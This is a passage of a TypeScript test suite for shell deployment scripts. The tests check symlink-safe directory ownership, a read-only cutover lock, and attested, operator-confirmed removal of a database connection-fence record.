  for (const entry of R9_SCRIPTS) {
    assert.match(entry.source, /source "\$\{IMS_SCRIPT_LIB_DIR\}\/cutover-namespace\.sh"/,
      `${entry.name} must source the library, and from its own release rather than from ${'${APP_DIR}'}`)
    // AND THE TWO PATHS COME OFF THE ROOT-OWNED PARENT, which is the finding restated as a
    // constant: a spelling under ${CUTOVER_STATE_DIR} is a spelling the service account owns.
    assert.match(entry.source, /^readonly CUTOVER_ROOT_DIR="\/etc\/ims-cutover-state"$/m,
      `${entry.name} must resolve the root-owned parent from a LITERAL, for the reason ${'${DB_ENV_SNAPSHOT_DIR}'} is one`)
    assert.match(entry.source, /^LOCK_FILE="\$\{CUTOVER_ROOT_DIR\}\/cutover\.lock"$/m,
      `${entry.name}: the shared lock must not live where ${'${APP_USER}'} can replace its name`)
    assert.match(entry.source, /^readonly DB_FENCE_DIR="\$\{CUTOVER_ROOT_DIR\}\/db-fence"$/m,
      `${entry.name}: nor the connection-fence directory`)
    assert.match(entry.source, /"\$\{CUTOVER_ROOT_DIR:-\}"/,
      `${entry.name}: and the publisher must accept the new root, or importing into it is refused`)
  }
})

test('[o3d-secops r22] the library aims every privileged operation at a descriptor and never at a name', () => {
  // A SOURCE-SHAPED CHECK, AND IT IS ABOUT GRAMMAR RATHER THAN PROXIMITY. What the behaviour tests
  // above cannot show is that the NEXT edit keeps the property: `chown "$owner" "$path"` would pass
  // every one of them on a host where the link is not planted at the instant the test runs. So the
  // two calls that apply ownership and mode to a walked-to directory are required to name `.` and
  // nothing else, and the lock is required to be opened for READING.
  const lib = readFileSync(CUTOVER_NS_LIB_PATH, 'utf8')
  const own = shellFunction(lib, 'own_service_subdir')
  assert.match(own, /^  chmod "\$\{mode\}" \.( |$)/m, `own_service_subdir must fchmod the descriptor it walked to:\n${own}`)
  assert.match(own, /^  chown "\$\{owner\}:\$\{owner\}" \. /m, `and fchown it:\n${own}`)
  const root = shellFunction(lib, 'ensure_cutover_root_dir')
  assert.match(root, /^  if ! chmod 711 \. \|\| ! chown "\$\(id -u\):\$\(id -g\)" \.; then$/m,
    `and the parent itself is walked into before its mode and owner are applied:\n${root}`)

  const acquire = shellFunction(lib, 'acquire_cutover_lock')
  assert.ok(acquire.includes('exec 9<"$LOCK_FILE"'),
    `the shared lock must be opened for READING — an O_RDONLY open has no O_CREAT and no O_TRUNC to aim:\n${acquire}`)
  assert.ok(!/exec 9>/.test(acquire) && !/exec 8>/.test(acquire) && !/exec 6>/.test(acquire),
    `and no descriptor in this file may be opened for writing:\n${acquire}`)
  assert.ok(acquire.indexOf('verify_held_lock 9') < acquire.indexOf('flock -n 9'),
    `and the descriptor must be judged BEFORE it is locked, or the judgement is about a lock already taken:\n${acquire}`)

  // AND THE WALK CAME ACROSS WHOLE. It is install.sh's, unchanged, and the entrypoint that used to
  // own it must not have kept a second copy — which the definition count above already refuses —
  // nor a divergent one, which this refuses.
  const walk = shellFunction(lib, 'enter_service_subdir')
  assert.match(walk, /if ! \(umask "\$\{mask\}"; mkdir "\$\{comp\}"\) 2>\/dev\/null; then/,
    `each component must be created with a PLAIN mkdir, which fails with EEXIST on a planted symlink:\n${walk}`)
  assert.match(walk, /stat -c '%F\|%d:%i' "\$\{comp\}"/, `lstat-ed, not stat -L:\n${walk}`)
  assert.match(walk, /cd -P "\$\{comp\}"/, `and entered, so the descriptor is the pin:\n${walk}`)
})

/**
 * EVERY RELEASE THAT REMOVES THE RECORD SAYS WHY IT MAY (o3d-secops r30, Codex HIGH 1).
 *
 * db_fence_clear_authority() is where the deletion happens on all three entrypoints, and since
 * r30 it refuses without an attestation that this run RAISED the fence it just released. That
 * fact is not in any database -- which is the point, because r29 measured that a physical copy of
 * a fenced cluster answers a release exactly as the original does -- so the only thing that can
 * supply it is the caller's own memory of its own act.
 *
 * THIS TEST IS ABOUT THE CALLERS, and it is a census rather than a spot check: a rule enforced in
 * the function and then bypassed by one of six call sites passing a constant would leave the
 * finding open on that path with the guard looking green. So every call in the three entrypoints
 * and the library is enumerated, and each is required to be one of exactly two shapes -- the
 * literal attestation, which only a run that published the record itself may use, or a variable
 * whose assignment is guarded by ${DB_FENCE_RAISED}.
 *
 * MUTATION ROUTE (made against the shipped files and reverted): change any call site to pass the
 * literal unconditionally -- which is what an ordinary "fix the argument" edit looks like -- and
 * the census names that file and line.
 */
test('[o3d-secops r30] every caller of db_fence_clear_authority attests, or passes nothing', () => {
  const FILES: ReadonlyArray<readonly [string, string]> = [
    ['scripts/lib/db-fence-protected.sh', readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8')],
    ['scripts/deploy.sh', readFileSync(join(process.cwd(), 'scripts/deploy.sh'), 'utf8')],
    ['scripts/update.sh', readFileSync(join(process.cwd(), 'scripts/update.sh'), 'utf8')],
    ['scripts/install.sh', readFileSync(join(process.cwd(), 'scripts/install.sh'), 'utf8')],
  ]

  const sites: { where: string; line: string }[] = []
  for (const [name, source] of FILES) {
    source.split(/\r?\n/).forEach((line, index) => {
      // The definition itself is not a call site.
      if (/^\s*db_fence_clear_authority\s*\(\s*\)/.test(line)) return
      if (!/db_fence_clear_authority\s+/.test(line)) return
      if (/^\s*#/.test(line)) return
      sites.push({ where: `${name}:${index + 1}`, line: line.trim() })
    })
  }

  // THE WALK REACHED THE FILES, stated as a number: a census that enumerated nothing would satisfy
  // every rule below vacuously, which is exactly how a guard comes to be green about nothing.
  assert.ok(sites.length >= 5,
    `the census must find the shipped call sites; it found ${sites.length}: ${sites.map((s) => s.where).join(', ')}`)

  const UNATTESTED = sites.filter(({ line }) => !/db_fence_clear_authority\s+\S+\s+\S/.test(line))
  assert.deepEqual(UNATTESTED, [],
    'a call with no second argument removes nothing since r30, so this is a path that silently stopped clearing its record rather than one that clears it safely')

  // WHERE THE LITERAL IS PERMITTED IS THE WHOLE RULE, and writing the census without that part is
  // how it comes to establish an adjacent property: a first draft of this test accepted the
  // literal at ANY site, so changing an entrypoint to pass it unconditionally -- exactly the
  // "fix the argument" edit somebody would make -- left the census green while reopening the
  // finding on that path. The literal is a claim that THIS RUN published the record it is
  // removing, and only db_fence_raise() is in a position to make it: it read ${had_authority}
  // before publishing and both of its calls are bounded by that. Every entrypoint's release is
  // releasing a fence it may not have raised, so there the attestation must be a value the flag
  // decided.
  const RAISE = shellFunction(readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8'), 'db_fence_raise')
  for (const site of sites) {
    const literal = /db_fence_clear_authority\s+\S+\s+"?raised-by-this-run"?/.test(site.line)
    const variable = /db_fence_clear_authority\s+\S+\s+"\$\{?clear_attestation\}?"/.test(site.line)
    assert.ok(literal || variable,
      `${site.where} passes something this census does not recognise as an attestation:\n  ${site.line}`)
    if (!literal) continue
    assert.ok(site.where.startsWith('scripts/lib/db-fence-protected.sh:'),
      `${site.where} claims outright that this run raised the fence it is clearing. Only db_fence_raise() may: an entrypoint's release runs against records earlier runs published too, and there the attestation must come from \${DB_FENCE_RAISED}.\n  ${site.line}`)
    assert.ok(RAISE.includes(site.line),
      `${site.where} makes that claim from outside db_fence_raise(), which is the only function that read whether an authority was already standing before it published one:\n  ${site.line}`)
  }

  // AND THE VARIABLE IS NEVER SET WITHOUT THE FLAG. Without this the shape check above is
  // satisfied by a caller that assigns the attestation unconditionally, which is the same defect
  // wearing a name.
  for (const [name, source] of FILES) {
    source.split(/\r?\n/).forEach((line, index) => {
      if (!/clear_attestation="raised-by-this-run"/.test(line)) return
      assert.match(line, /DB_FENCE_RAISED/,
        `${name}:${index + 1} assigns the attestation without asking whether this run raised the fence:\n  ${line.trim()}`)
    })
  }

  // AND SINCE r31, EVERY CALL SAYS WHICH SERVER TOO (o3d-secops r31, Codex HIGH 1). "This run
  // raised the fence" is a fact about a PROCESS, and a process spans the two connections a proxy or
  // a failover can separate; the removal therefore takes a second literal saying which server was
  // released. The same census shape, for the same reason: a rule enforced in the function and
  // bypassed by one call site passing the literal unconditionally would leave the finding open on
  // that path with the guard green.
  //
  // MUTATION ROUTE (made against the shipped files and reverted): change an entrypoint's release to
  // pass `"same-server-as-the-fence"` outright instead of ${clear_server}, and the census names it.
  for (const site of sites) {
    // The third argument as it is WRITTEN, quotes and all, and stopping at the closing quote --
    // these calls sit inside `if ! ... ; then`, so a greedy \\S+ swallows the `;` and every
    // comparison below then fails against a token nobody wrote.
    const third = /db_fence_clear_authority\s+\S+\s+\S+\s+("[^"]*")/.exec(site.line)
    assert.ok(third, `${site.where} passes no answer about WHICH SERVER it released, so since r31 it removes nothing:\n  ${site.line}`)
    const literal = third![1].replace(/"/g, '')
    if (literal === 'nothing-was-revoked') {
      // The only place that may say it: db_fence_raise() removing its OWN publication after a
      // failure that is strictly BEFORE any REVOKE, where there is no server to be wrong about.
      assert.ok(site.where.startsWith('scripts/lib/db-fence-protected.sh:') && RAISE.includes(site.line),
        `${site.where} claims nothing was revoked, which only db_fence_raise()'s two removals of its own never-executed publication may:\n  ${site.line}`)
      continue
    }
    assert.match(third![1], /^"\$\{?clear_server\}?"$/,
      `${site.where} must take its answer about the server from a value the release's own output decided, not from a literal:\n  ${site.line}`)
  }

  // AND THAT VALUE IS ONLY EVER SET FROM THE RELEASE'S OWN REPORT, UNDER A GUARD THAT ALSO PROVES
  // THE QUESTION WAS ASKED (o3d-secops r31, extended r32 for Codex HIGH 1).
  //
  // r31 wrote this as a SAME-LINE rule -- the assignment had to carry `witness_colocated=yes` on
  // its own line -- and that is the vacuous shape this branch keeps rediscovering: it holds only
  // while the guard happens to fit on one line, and it says nothing about what the guard ASKS. r32
  // splits the guard across three lines (it now takes two conditions), so the same-line rule would
  // have had to be deleted to make the file pass, which is a rule deleting itself.
  //
  // SO IT IS ASKED OF THE ENCLOSING CONDITIONAL INSTEAD. From the assignment, walk UP to the `if`
  // that governs it, and require that conditional to contain BOTH halves: the strict whole-line
  // reader over the release's own output, AND the proof that a challenge was issued at all. Either
  // one alone is a defect this branch has already shipped once.
  //
  // MUTATION ROUTE (made against the shipped files and reverted): drop `${#witness_argv[@]}` from
  // deploy.sh's guard, leaving only the verdict read, and this names deploy.sh; replace the whole
  // guard with `if true; then` and it names it again. Delete the `if` and the walk below finds
  // none, which is its own failure rather than a silent pass.
  let guardedAssignments = 0
  for (const [name, source] of FILES) {
    const lines = source.split(/\r?\n/)
    lines.forEach((line, index) => {
      if (!/clear_server="same-server-as-the-fence"/.test(line)) return
      guardedAssignments += 1
      let open = -1
      for (let back = index; back >= 0; back -= 1) {
        if (/^\s*if\s/.test(lines[back])) { open = back; break }
        if (/^\s*(fi|esac|\})\s*$/.test(lines[back])) break
      }
      assert.notEqual(open, -1,
        `${name}:${index + 1} sets which server was released with no conditional governing it at all:\n  ${line.trim()}`)
      const guard = lines.slice(open, index + 1).join('\n')
      assert.match(guard, /db_fence_machine_verdict "[^"]*" "RELEASE_WITNESS"/,
        `${name}:${index + 1} decides which server was released without reading, as a whole line and against this run's own nonce, what the release itself reported:\n${guard}`)
      assert.match(guard, /\$\{#witness_argv\[@\]\}/,
        `${name}:${index + 1} acts on a witness verdict without first showing that a challenge was ISSUED. A stream that answers a question nobody asked must not license a deletion:\n${guard}`)
    })
  }
  // THE WALK REACHED THEM, stated as a number: three entrypoints, one assignment each. A loop that
  // matched nothing would otherwise pass exactly as one that matched everything and found it sound.
  assert.equal(guardedAssignments, 3,
    `the census must reach one guarded assignment per entrypoint; it reached ${guardedAssignments}`)

  // THE FUNCTION ITSELF REFUSES, EXERCISED UNDER A REAL SHELL rather than read. Both directions,
  // so a passing test cannot be a function that never removes anything.
  const dir = mkdtempSync(join(tmpdir(), 'ims-clear-'))
  try {
    const record = join(dir, 'db-connect-fence.json')
    const CLEAR = shellFunction(readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8'), 'db_fence_clear_authority')
    // o3d-secops r31: two answers, WHO and WHICH SERVER, so this takes both and each loop below
    // holds one of them right and varies the other.
    const ask = (attestation: string, server = 'same-server-as-the-fence') => {
      writeFileSync(record, '{"state_complete":1}\n')
      const run = runShell([
        'set -uo pipefail',
        'exec 2>&1',
        'DB_FENCE_SUDO_PREFIX=""',
        'DB_FENCE_RELEASE_WRAPPER="/opt/cutover/release-db-fence"',
        CLEAR,
        `db_fence_clear_authority ${JSON.stringify(record)} ${JSON.stringify(attestation)} ${JSON.stringify(server)}`,
        'echo "RC=$?"',
      ].join('\n'))
      return { output: run.output, survived: existsSync(record) }
    }

    for (const wrong of ['', 'true', 'yes', 'raised-by-this-run ', 'RAISED-BY-THIS-RUN']) {
      const refused = ask(wrong)
      assert.match(refused.output, /^RC=2$/m, `${JSON.stringify(wrong)} must not license an unlink:\n${refused.output}`)
      assert.equal(refused.survived, true, `and ${JSON.stringify(wrong)} must leave the record where it was`)
    }

    // AND THE SAME CENSUS OF NEAR-MISSES ON THE SECOND ANSWER (o3d-secops r31, Codex HIGH 1). The
    // WHO is correct in every one of these, which is the point: r30's attestation on its own is
    // satisfied by a run whose release was re-pointed to a copy of the fenced cluster.
    for (const wrong of ['', 'true', 'yes', 'same-server-as-the-fence ', 'SAME-SERVER-AS-THE-FENCE', 'nothing-was-revoked-x']) {
      const refused = ask('raised-by-this-run', wrong)
      assert.match(refused.output, /^RC=2$/m, `${JSON.stringify(wrong)} must not license an unlink either:\n${refused.output}`)
      assert.equal(refused.survived, true, `and ${JSON.stringify(wrong)} must leave the record where it was`)
    }

    const allowed = ask('raised-by-this-run')
    assert.match(allowed.output, /^RC=0$/m, `an attested removal must still happen:\n${allowed.output}`)
    assert.equal(allowed.survived, false, 'and the record must be gone')

    // AND THE OTHER PERMITTED SECOND ANSWER REMOVES TOO, or db_fence_raise() could never clear its
    // own never-executed publication and every refused initial fence would leave litter behind.
    const nothingRevoked = ask('raised-by-this-run', 'nothing-was-revoked')
    assert.match(nothingRevoked.output, /^RC=0$/m, `a record nothing revoked from must still be removable:\n${nothingRevoked.output}`)
    assert.equal(nothingRevoked.survived, false, 'and that record must be gone as well')

    // AND AN ABSENT RECORD IS NOT A REFUSAL: the recovery paths reach this after a release that
    // found no record at all, and turning that into a refusal would stop the one state that needs
    // no decision.
    const nothing = runShell([
      'set -uo pipefail',
      'exec 2>&1',
      'DB_FENCE_SUDO_PREFIX=""',
      'DB_FENCE_RELEASE_WRAPPER="/opt/cutover/release-db-fence"',
      CLEAR,
      `db_fence_clear_authority ${JSON.stringify(join(dir, 'not-there.json'))} "" ""`,
      'echo "RC=$?"',
    ].join('\n'))
    assert.match(nothing.output, /^RC=0$/m, `nothing to remove is not something to refuse:\n${nothing.output}`)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

/**
 * AND THE BAKED RELEASE WRAPPER NEVER UNLINKS ON ITS OWN (o3d-secops r30, Codex HIGH 1 + MEDIUM).
 *
 * The wrapper root writes into the cutover recovery directory is the case the finding is really
 * about: it is run by a person, days later, against a record an earlier run published, so it has
 * no memory to attest with and the copy it may be pointed at is not a thought experiment. It used
 * to `rm -f` the record on the helper's exit 0.
 *
 * MUTATION ROUTE: put `rm -f "${state_file}"` back into release_the_fence() and the first
 * assertion fails; delete the `-ne 6` half of its status test and the retry assertion fails.
 */
test('[o3d-secops r30] the release wrapper asks before it removes, and completes a retry', () => {
  const LIBRARY = readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8')
  // release_the_fence() lives INSIDE the quoted WRAPPER_EOF heredoc that
  // db_fence_publish_operator_wrappers() writes into the cutover recovery directory, so it has to
  // be lifted out of the heredoc before it can be read as shell.
  const OPEN = "cat <<'WRAPPER_EOF'\n"
  const CLOSE = '\nWRAPPER_EOF\n'
  const opened = LIBRARY.indexOf(OPEN)
  const closed = LIBRARY.indexOf(CLOSE, opened)
  assert.ok(opened >= 0 && closed > opened, 'the wrapper body must still be a quoted heredoc in the library')
  const WRAPPER_BODY = LIBRARY.slice(opened + OPEN.length, closed)
  const RELEASE = shellFunction(WRAPPER_BODY, 'release_the_fence')

  // THE PRECONDITION: this is the function that runs the release, or the assertions below are
  // about some other text entirely.
  assert.match(RELEASE, /--release/, `the subject must be the release arm:\n${RELEASE}`)

  assert.doesNotMatch(RELEASE, /\brm -f\b/,
    `the standalone release wrapper may not unlink the record on its own -- it cannot show which server answered:\n${RELEASE}`)
  assert.match(RELEASE, /operator_confirms clear/,
    `and the removal must be confirmed at the terminal:\n${RELEASE}`)
  assert.match(RELEASE, /decision_token clear "\$\{digest\}" "\$\{identity\}"/,
    `bound to the record's exact bytes AND the cluster that answered, so the token cannot be reused:\n${RELEASE}`)
  assert.match(RELEASE, /node -e "\$\{clear_authority\}" -- "\$\{state_file\}" "\$\{digest\}"/,
    `and the removal itself is the compare-and-swap, not a name:\n${RELEASE}`)

  // THE RETRY: exit 6 is EXIT_ALREADY_RELEASED and must be accepted exactly as 0 is, or the loop
  // r30 exists to break is still there.
  assert.match(RELEASE, /"\$\{rc\}" -ne 0 && "\$\{rc\}" -ne 6/,
    `a release that finds its grants already restored must still reach the removal offer:\n${RELEASE}`)

  // AND THE HELPER REALLY DOES PRODUCE THAT STATUS AND THAT LINE, so the wrapper is not reading
  // for something nothing emits.
  const HELPER = readFileSync(join(process.cwd(), 'scripts/fence-db-connections.mjs'), 'utf8')
  assert.match(HELPER, /export const EXIT_ALREADY_RELEASED = 6/, 'the helper must define that status')
  assert.match(HELPER, /release_cluster_identity=/, 'and print the cluster line the token binds')
})

// ---------------------------------------------------------------------------
// o3d-secops r31, Codex HIGH 2 — A FENCE THAT WENT UP LOST ITS OWN RECORD OF STANDING.
//
// `DB_FENCE_UP` and `DB_FENCE_RAISED` used to be assigned AFTER `--print-migration-url` had run
// and its output had been validated. So a fence that had genuinely gone up — REVOKEs committed,
// authority stamped — lost both flags to a failure that had nothing to do with it: an OOM kill of
// `node`, a signal, a URL this run could not compose. The exit trap then released the grants and
// the r30 removal gate, seeing no attestation, kept the record; the next unattended run read a
// stamped, already-released authority and stopped for a terminal confirmation nobody was there to
// give.
//
// The flags are the fact that `db_fence_raise()` returned 0, and nothing between that return and
// their assignment may be able to make it untrue. These run the shipped functions, in all three
// entrypoints, with a helper that fences and then refuses to compose a URL.
// ---------------------------------------------------------------------------

/** Fences successfully, refuses `--print-migration-url`, and answers a release with exit 4. */
function fenceStubUrlFails(dir: string): void {
  writeFenceCheckout(
    dir,
    [
      "import { appendFileSync } from 'node:fs'",
      `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, process.argv.slice(2).join(' ') + '\\n')`,
      // THE FALLIBLE STEP THAT IS NOT THE FENCE. It runs after the REVOKEs are committed and it
      // knows nothing about them, which is the whole shape of the finding.
      "if (process.argv.includes('--print-migration-url')) process.exit(7)",
      "if (process.argv.includes('--release')) process.exit(4)",
      'process.exit(0)',
      '',
    ].join('\n'),
  )
}

for (const entry of FENCE_HARNESS) {
  test(`${entry.name} keeps the attestation for a fence that went up when a later step fails (o3d-secops r31, Codex HIGH 2)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r31urlfail-'))
    try {
      fenceStubUrlFails(dir)
      const program = [
        'set -uo pipefail',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        shellFunction(entry.source, 'release_db_connections'),
        'on_exit() { if release_db_connections; then echo "TRAP RELEASE SAID OK"; else echo "TRAP RELEASE REFUSED"; fi; }',
        'trap on_exit EXIT',
        'fence_db_connections',
        'echo "REACHED THE MIGRATION"',
      ].join('\n')
      const result = runShell(program)

      // MUTATION ROUTE: move the `DB_FENCE_UP=true` / `DB_FENCE_RAISED=true` pair back below the
      // `[[ -n "$MIGRATION_DATABASE_URL" ]] || die` line — which is exactly where they were before
      // this round — and 'TRAP RELEASE SAID OK' is printed instead, over a fence that is standing.
      assert.match(calls(dir), /^--fence /m, 'precondition: the fence itself was reached and executed')
      assert.match(calls(dir), /^--print-migration-url /m, 'precondition: and the step that fails ran after it')
      assert.ok(!result.output.includes('REACHED THE MIGRATION'),
        `a run that cannot compose a migration URL must still not migrate:\n${result.output}`)
      assert.match(result.output, /TRAP RELEASE REFUSED/,
        `the fence went up, so a release that can prove nothing about the record must refuse:\n${result.output}`)
      assert.ok(!result.output.includes('TRAP RELEASE SAID OK'),
        `which is the branch a lost DB_FENCE_RAISED takes -- and the one this finding is about:\n${result.output}`)
      assert.match(result.output, /RECORD IS GONE/,
        `and it must say that THIS RUN raised the fence whose record it can no longer find:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // -------------------------------------------------------------------------
  // o3d-secops r31 — THE WITNESS MAY COST THE AUTOMATION AND NOTHING ELSE.
  //
  // This is the safety property the whole of HIGH 1's fix rests on: nothing about a witness may
  // refuse a fence, fail a release, or stop a migration. A cluster with no second database, a
  // pooler that hands out no stable backend, a helper too old to know the mode — each must cost the
  // automatic removal of the record at the end of the run and NOTHING else.
  //
  // MUTATION ROUTE (made against the shipped file and reverted): make the witness load-bearing in
  // db_fence_raise() — `db_fence_witness_start ... || return 3` in place of the `if`, which is the
  // shape somebody reaches for on being told the attestation matters — and this run refuses to
  // fence at all, with 'REACHED THE MIGRATION' unprinted.
  //
  // (The SIGPIPE hazard the teardown ONCE had is guarded separately and deterministically at the
  // end of this file: whether it fires here depends on when bash happens to reap the co-process,
  // and a guard that rests on that is a guard that is green about nothing.)
  // -------------------------------------------------------------------------
  test(`${entry.name} fences and migrates normally when no witness can be held (o3d-secops r31)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r31nowitness-'))
    try {
      // Everything succeeds except `--witness`, which refuses outright — a cluster with no second
      // database, a pooler that will not give out a stable backend, a helper too old to know the
      // mode. The fence must be completely unaffected.
      writeFenceCheckout(
        dir,
        [
          "import { appendFileSync } from 'node:fs'",
          `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, process.argv.slice(2).join(' ') + '\\n')`,
          "if (process.argv.includes('--witness')) process.exit(9)",
          "if (process.argv.includes('--print-migration-url')) { process.stdout.write('postgres://admin@127.0.0.1/main?options=-c%20role%3Dimsapp\\n'); process.exit(0) }",
          'process.exit(0)',
          '',
        ].join('\n'),
      )
      const program = [
        'set -uo pipefail',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        'fence_db_connections',
        'echo "REACHED THE MIGRATION"',
      ].join('\n')
      const result = runShell(program)

      assert.match(calls(dir), /^--witness /m, 'precondition: a witness was attempted, or this measures nothing')
      assert.match(calls(dir), /^--fence /m, 'and the fence itself still ran')
      assert.match(result.output, /REACHED THE MIGRATION/,
        `a witness that cannot be held must cost the automatic removal of the record and NOTHING else:\n${result.output}`)
      assert.notEqual(result.status, -1,
        `and the run must not die on a signal, which is what writing down a dead co-process's pipe did:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
}

// ---------------------------------------------------------------------------
// o3d-secops r31, Codex HIGH 1 — THE ENTRYPOINT SIDE OF THE BINDING.
//
// The library refuses without the second attestation and the helper decides what that attestation
// is; what is left, and what these measure, is the SHELL BETWEEN THEM. An entrypoint that issued
// the challenge, ran the release and then removed the record from its own DB_FENCE_RAISED flag
// regardless of what the release reported would leave the finding entirely open with every other
// test in this round green.
//
// Both directions, in all three entrypoints, with the SAME stub differing only in the one line the
// release reports — so a passing negative cannot be a path that never removes anything.
// ---------------------------------------------------------------------------

/** The full cycle stub of the r23 ordering test, with the release's verdict as a parameter. */
function witnessCycleCheckout(dir: string, verdict: 'yes' | 'no'): void {
  const helper = writeFenceCheckout(dir, '')
  writeFileSync(helper, [
    "import { appendFileSync } from 'node:fs'",
    `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, process.argv.slice(2).join(' ') + '\\n')`,
    "if (process.argv.includes('--plan')) {",
    "  process.stdout.write(JSON.stringify({",
    "    database: 'imsdb', owner_role: 'imsapp', app_role: 'imsapp', admin_role: 'deployadmin',",
    "    revoked: ['PUBLIC', 'imsapp'], datacl_before: null, fenced_at: '2026-01-01T00:00:00.000Z',",
    "  }) + '\\n')",
    '}',
    // o3d-secops r32: STAMPED, because the shipped `--print-migration-url` stamps. Root reads the
        // nonce back out of this URL and asks the witness about that value, so a stub that emitted a
        // bare URL would exercise the "this run composed a migration it cannot place" refusal on every
        // ordinary cutover instead of the cutover.
        "if (process.argv.includes('--print-migration-url')) process.stdout.write(`postgres://admin@127.0.0.1/nowhere?application_name=ims-migration-${process.argv.find((a) => a.startsWith('--migration-nonce='))?.slice('--migration-nonce='.length) ?? ''}\\n`)",
    ...WITNESS_STUB_LINES(verdict),
    'process.exit(0)',
    '',
  ].join('\n'))
}

for (const entry of FENCE_HARNESS) {
  for (const verdict of ['yes', 'no'] as const) {
    const cleared = verdict === 'yes'
    // The label is the r32 grammar, because the r31 one no longer exists: the verdict is a whole
    // line naming this run's own nonce, and a test named after the token it used to be a substring
    // of is a name that tells the next reader something untrue about what it exercises.
    test(`${entry.name} removes its own record only when the release saw the witness (RELEASE_WITNESS ${verdict === 'yes' ? 'colocated' : 'absent'}) (o3d-secops r31, Codex HIGH 1)`, () => {
      const dir = mkdtempSync(join(tmpdir(), `ims-r31verdict-${verdict}-`))
      try {
        witnessCycleCheckout(dir, verdict)
        const program = [
          'set -uo pipefail',
          // The refusal an operator has to read is on stderr, and this run is expected to SUCCEED,
          // so runShell() would return stdout alone and the assertion would be about nothing.
          'exec 2>&1',
          entry.preamble(dir),
          'error() { echo "ERROR: $*" >&2; }',
          'DB_FENCE_RAISED=false',
          CUTOVER_DIR_PRIMITIVES,
          shellFunction(entry.source, 'fence_db_connections'),
          shellFunction(entry.source, 'release_db_connections'),
          'fence_db_connections',
          'release_db_connections || echo "RELEASE REPORTED FAILURE"',
          '[[ -e "${DB_FENCE_STATE}" ]] && echo AUTHORITY_REMAINS || echo AUTHORITY_CLEARED',
        ].join('\n')
        const result = runShell(program)

        // THE PRECONDITIONS, so neither direction can pass on a run that did none of this.
        assert.match(calls(dir), /^--witness --witness-nonce=[0-9a-f]{32} /m,
          `the fence must open a witness before it revokes:\n${result.output}`)
        assert.match(calls(dir), /^--fence .*--witness-lock=[0-9a-f]{32}/m,
          `and tell --fence which lock to look for:\n${result.output}`)
        assert.match(calls(dir), /^--release .*--witness-challenge=[0-9a-f]{32}/m,
          `and the release must be given a challenge minted at release time:\n${result.output}`)
        // AND THE CHALLENGE IS NOT THE FENCE'S OWN NONCE. A reused one would be a lock some earlier
        // snapshot of the cluster could already contain, which is the property being bought here.
        const fenceNonce = /--witness-lock=([0-9a-f]{32})/.exec(calls(dir))?.[1]
        const challenge = /--witness-challenge=([0-9a-f]{32})/.exec(calls(dir))?.[1]
        assert.ok(fenceNonce && challenge, `both nonces must reach the helper:\n${calls(dir)}`)
        assert.notEqual(fenceNonce, challenge, 'the release challenge must be fresh, not the fence own nonce')

        // MUTATION ROUTE (all made against the shipped files and reverted): in the entrypoint's
        // release, assign clear_server unconditionally instead of from the release's own verdict --
        // the 'no' case then prints AUTHORITY_CLEARED. Drop the third argument from the
        // db_fence_clear_authority call -- the 'yes' case prints AUTHORITY_REMAINS, and the
        // ordinary cutover starts asking a human on every deploy. Make db_fence_witness_nonce()
        // return a constant -- the freshness assertion above fails in both directions.
        if (cleared) {
          assert.match(result.output, /^AUTHORITY_CLEARED$/m,
            `a release whose own connection saw the witness must end its own record with nobody at a terminal:\n${result.output}`)
          assert.ok(!/RELEASE REPORTED FAILURE/.test(result.output),
            `and the ordinary cutover must not report a failure:\n${result.output}`)
        } else {
          assert.match(result.output, /^AUTHORITY_REMAINS$/m,
            `a release that could not see the witness may have landed on a copy, so the record must survive:\n${result.output}`)
          assert.match(result.output, /RELEASE REPORTED FAILURE/,
            `and the entrypoint must say so rather than reporting a clean release:\n${result.output}`)
          assert.match(result.output, /deliberately NOT removed/,
            `naming the record it kept and how to end it:\n${result.output}`)
        }
      } finally {
        rmSync(dir, { recursive: true, force: true })
      }
    })
  }
}

/**
 * TAKING THE WITNESS DOWN MUST NOT TAKE THE ENTRYPOINT'S STDERR WITH IT (o3d-secops r31).
 *
 * This is a regression test for a defect this round INTRODUCED and then removed, and it is here
 * because the defect was invisible in exactly the way that matters: `exec {fd}>&- 2>/dev/null` is a
 * BARE `exec` with a redirection, so bash applies the `2>/dev/null` TO THE SHELL and keeps it. Every
 * warning, refusal and `die` the entrypoint printed after its first witness teardown then went to
 * /dev/null -- and a cutover's stderr is the only account an operator has of a fence that is
 * standing, a record that was kept, or a migration that was refused. It surfaced as eight
 * intermittent failures in this file, every one of them on a message about a FENCE, and not one of
 * them naming the witness at all.
 *
 * MUTATION ROUTE (made against the shipped file and reverted): un-group either close in
 * db_fence_witness_stop() -- `{ exec {fd}>&-; } 2>/dev/null` back to `exec {fd}>&- 2>/dev/null` --
 * and the line after the teardown is not printed.
 */
test('[o3d-secops r31] taking the connection witness down leaves the shell able to speak', () => {
  const FENCE_LIB = readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8')
  const result = runShell([
    'set -uo pipefail',
    'exec 2>&1',
    'db_fence_helper() { cat; }',
    shellFunction(FENCE_LIB, 'db_fence_witness_nonce'),
    shellFunction(FENCE_LIB, 'db_fence_witness_stop'),
    'DB_FENCE_WITNESS_BOUND=0',
    'echo "BEFORE" >&2',
    // A REAL CO-PROCESS, so the fds are real and the teardown is the one that runs on every cutover.
    'coproc DB_FENCE_WITNESS { db_fence_helper; }',
    'db_fence_witness_stop',
    'echo "AFTER ONE TEARDOWN" >&2',
